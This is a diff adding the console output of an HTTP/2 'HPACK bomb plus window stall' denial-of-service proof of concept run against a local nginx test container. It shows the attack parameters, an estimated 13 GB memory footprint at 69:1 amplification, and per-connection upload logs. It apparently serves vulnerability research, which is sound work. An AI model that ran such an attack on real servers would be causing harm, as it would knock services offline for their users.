@@ -1,0 +1,82 @@
+
+======================================================================
+  HPACK Bomb + Window Stall PoC
+  Target:      127.0.0.1:8443
+  Connections: 50
+  Streams:     128 per connection
+  Headers:     32,000 per stream
+  Hold:        120s (drip every 30s)
+======================================================================
+
+  Estimated server memory:
+    Per stream:     2.1 MB
+    Per connection: 270 MB
+    Total:          13482 MB (13.2 GB)
+    Wire upload:    195 MB
+    Amplification:  69:1
+
+[*] Phase 1a: Establishing 50 TLS+H2 connections...
+    50/50 connections established in 4.5s
+[*] Phase 1b: Sending HPACK bombs on all 50 connections...
+    Connection 32: sent 3.9 MB
+    Connection 40: sent 3.9 MB
+    Connection 43: sent 3.9 MB
+    Connection 31: sent 3.9 MB
+    Connection 34: sent 3.9 MB
+    Connection 45: sent 3.9 MB
+    Connection 49: sent 3.9 MB
+    Connection 44: sent 3.9 MB
+    Connection 33: sent 3.9 MB
+    Connection 36: sent 3.9 MB
+    Connection 37: sent 3.9 MB
+    Connection 35: sent 3.9 MB
+    Connection 38: sent 3.9 MB
+    Connection 42: sent 3.9 MB
+    Connection 39: sent 3.9 MB
+    Connection 48: sent 3.9 MB
+    Connection 41: sent 3.9 MB
+    Connection 47: sent 3.9 MB
+    Connection 46: sent 3.9 MB
+    Connection 8: sent 3.9 MB
+    Connection 7: sent 3.9 MB
+    Connection 0: sent 3.9 MB
+    Connection 5: sent 3.9 MB
+    Connection 6: sent 3.9 MB
+    Connection 9: sent 3.9 MB
+    Connection 4: sent 3.9 MB
+    Connection 10: sent 3.9 MB
+    Connection 11: sent 3.9 MB
+    Connection 12: sent 3.9 MB
+    Connection 13: sent 3.9 MB
+    Connection 14: sent 3.9 MB
+    Connection 15: sent 3.9 MB
+    Connection 16: sent 3.9 MB
+    Connection 17: sent 3.9 MB
+    Connection 3: sent 3.9 MB
+    Connection 1: sent 3.9 MB
+    Connection 18: sent 3.9 MB
+    Connection 19: sent 3.9 MB
+    Connection 2: sent 3.9 MB
+    Connection 20: sent 3.9 MB
+    Connection 21: sent 3.9 MB
+    Connection 22: sent 3.9 MB
+    Connection 23: sent 3.9 MB
+    Connection 24: sent 3.9 MB
+    Connection 25: sent 3.9 MB
+    Connection 26: sent 3.9 MB
+    Connection 27: sent 3.9 MB
+    Connection 28: sent 3.9 MB
+    Connection 29: sent 3.9 MB
+    Connection 30: sent 3.9 MB
+
+[*] Phase 1 complete: 50 connections, 195.5 MB uploaded in 2.3s
+    Upload rate: 83.7 MB/s
+
+[*] Phase 2: Holding server memory for 120s (drip every 30s)...
+    Monitor RSS with: docker exec nginx-h2-poc /usr/bin/python3 /poc/monitor_rss.py
+    Press Ctrl+C to stop early.
+
+
+[*] Done. Total time: 127s
+    Connections still active: 50/50
+    Total wire uploaded: 195.5 MB
